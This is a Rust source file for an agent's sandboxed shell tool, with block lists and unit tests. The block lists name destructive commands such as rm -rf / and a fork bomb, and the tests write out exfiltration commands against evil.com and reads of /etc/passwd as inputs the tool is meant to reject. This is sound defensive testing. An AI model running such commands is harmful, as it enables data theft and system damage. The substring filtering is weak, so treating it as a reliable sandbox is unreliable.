//! Shell tool - sandboxed command execution in user workspace.

use anyhow::Result;
use async_trait::async_trait;
use std::time::Duration;
use tokio::process::Command;

use crate::base::{Tool, ToolContext};

/// Shell tool that executes commands in the user's workspace directory.
///
/// Commands are sandboxed to the user's workspace with a timeout.
/// Shell command execution tool.
pub struct ShellTool {
    timeout_secs: u64,
}

impl ShellTool {
    pub fn new(timeout_secs: u64) -> Self {
        Self { timeout_secs }
    }
}

impl Default for ShellTool {
    fn default() -> Self {
        Self::new(30)
    }
}

#[async_trait]
impl Tool for ShellTool {
    fn name(&self) -> &str {
        "shell"
    }

    fn description(&self) -> &str {
        "Execute a shell command in the user's workspace directory. Returns stdout and stderr."
    }

    fn parameters(&self) -> serde_json::Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The shell command to execute"
                }
            },
            "required": ["command"]
        })
    }

    async fn execute(&self, args: &str, ctx: &ToolContext) -> Result<String> {
        let parsed: serde_json::Value = serde_json::from_str(args)
            .unwrap_or_else(|_| serde_json::json!({"command": args}));

        let command = parsed["command"]
            .as_str()
            .ok_or_else(|| anyhow::anyhow!("Missing 'command' parameter"))?;

        // Security: block dangerous system commands
        let dangerous = ["rm -rf /", "mkfs", "dd if=", "> /dev/sd", ":(){:|:&};:", "chmod -R 777 /"];
        for pattern in &dangerous {
            if command.contains(pattern) {
                anyhow::bail!("Command contains blocked pattern: {}", pattern);
            }
        }

        // Security: block workspace escape attempts
        // 1. Block ".." in any form to prevent directory traversal
        if command.contains("..") {
            anyhow::bail!("Command contains path traversal ('..') which is not allowed");
        }

        // 2. Block absolute paths to sensitive system/other-user directories
        let sensitive_prefixes = [
            "/etc/", "/proc/", "/sys/", "/dev/",
            "/root/", "/boot/", "/var/log",
        ];
        for prefix in &sensitive_prefixes {
            if command.contains(prefix) {
                anyhow::bail!("Command contains blocked absolute path: {}", prefix);
            }
        }

        // 3. Block network exfiltration tools
        let network_dangerous = ["curl ", "wget ", "nc ", "ncat ", "ssh "];
        for pattern in &network_dangerous {
            if command.contains(pattern) {
                anyhow::bail!("Command contains blocked network tool: {}", pattern.trim());
            }
        }

        let output = Command::new("sh")
            .arg("-c")
            .arg(command)
            .current_dir(&ctx.workspace_root)
            .output();

        let result = tokio::time::timeout(Duration::from_secs(self.timeout_secs), output).await??;

        let stdout = String::from_utf8_lossy(&result.stdout);
        let stderr = String::from_utf8_lossy(&result.stderr);

        if result.status.success() {
            if stderr.is_empty() {
                Ok(stdout.to_string())
            } else {
                Ok(format!("{}\n[stderr] {}", stdout, stderr))
            }
        } else {
            Ok(format!(
                "[exit code {}] {}\n[stderr] {}",
                result.status.code().unwrap_or(-1),
                stdout,
                stderr
            ))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::base::ToolContext;

    fn make_ctx(dir: &std::path::Path) -> ToolContext {
        ToolContext {
            user_id: "test-user".to_string(),
            workspace_root: dir.to_string_lossy().to_string(),
        }
    }

    #[tokio::test]
    async fn test_shell_echo() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = make_ctx(dir.path());
        let tool = ShellTool::new(5);

        let result = tool.execute(r#"{"command":"echo hello_world"}"#, &ctx).await.unwrap();
        assert!(result.contains("hello_world"));
    }

    #[tokio::test]
    async fn test_shell_create_and_run_python() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = make_ctx(dir.path());
        let tool = ShellTool::new(10);

        // Create a Python file and run it
        let create_cmd = r#"{"command":"echo \"print('py_ok')\" > test.py"}"#;
        tool.execute(create_cmd, &ctx).await.unwrap();

        let run_cmd = r#"{"command":"python3 test.py"}"#;
        let result = tool.execute(run_cmd, &ctx).await.unwrap();
        assert!(result.contains("py_ok"));
    }

    #[tokio::test]
    async fn test_shell_blocked_command() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = make_ctx(dir.path());
        let tool = ShellTool::new(5);

        let result = tool.execute(r#"{"command":"rm -rf /"}"#, &ctx).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_shell_isolation_blocks_traversal() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = make_ctx(dir.path());
        let tool = ShellTool::new(5);

        // All path traversal attempts via ".." should be blocked
        let traversal_attempts = [
            r#"{"command":"cat ../other_user/secret.txt"}"#,
            r#"{"command":"ls -la ../../"}"#,
            r#"{"command":"cd .. && ls"}"#,
            r#"{"command":"cp ../../../etc/passwd ."}"#,
        ];
        for cmd in &traversal_attempts {
            let result = tool.execute(cmd, &ctx).await;
            assert!(result.is_err(), "Should block traversal: {}", cmd);
        }
    }

    #[tokio::test]
    async fn test_shell_isolation_blocks_absolute_paths() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = make_ctx(dir.path());
        let tool = ShellTool::new(5);

        // Absolute paths to sensitive directories should be blocked
        let absolute_attempts = [
            r#"{"command":"cat /etc/passwd"}"#,
            r#"{"command":"ls /proc/self"}"#,
            r#"{"command":"cat /var/log/syslog"}"#,
            r#"{"command":"ls /root/"}"#,
        ];
        for cmd in &absolute_attempts {
            let result = tool.execute(cmd, &ctx).await;
            assert!(result.is_err(), "Should block absolute path: {}", cmd);
        }
    }

    #[tokio::test]
    async fn test_shell_isolation_blocks_network_tools() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = make_ctx(dir.path());
        let tool = ShellTool::new(5);

        // Network tools that could exfiltrate data should be blocked
        let network_attempts = [
            r#"{"command":"curl http://evil.com/steal"}"#,
            r#"{"command":"wget http://evil.com/malware"}"#,
            r#"{"command":"nc evil.com 4444"}"#,
        ];
        for cmd in &network_attempts {
            let result = tool.execute(cmd, &ctx).await;
            assert!(result.is_err(), "Should block network tool: {}", cmd);
        }
    }

    #[tokio::test]
    async fn test_shell_allows_normal_workspace_operations() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = make_ctx(dir.path());
        let tool = ShellTool::new(5);

        // Normal workspace operations should work fine
        let result = tool.execute(r#"{"command":"echo hello > test.txt && cat test.txt"}"#, &ctx).await;
        assert!(result.is_ok());
        assert!(result.unwrap().contains("hello"));

        // ls, mkdir, pwd should work
        let result = tool.execute(r#"{"command":"mkdir -p src && echo done"}"#, &ctx).await;
        assert!(result.is_ok());

        let result = tool.execute(r#"{"command":"pwd"}"#, &ctx).await;
        assert!(result.is_ok());
    }
}
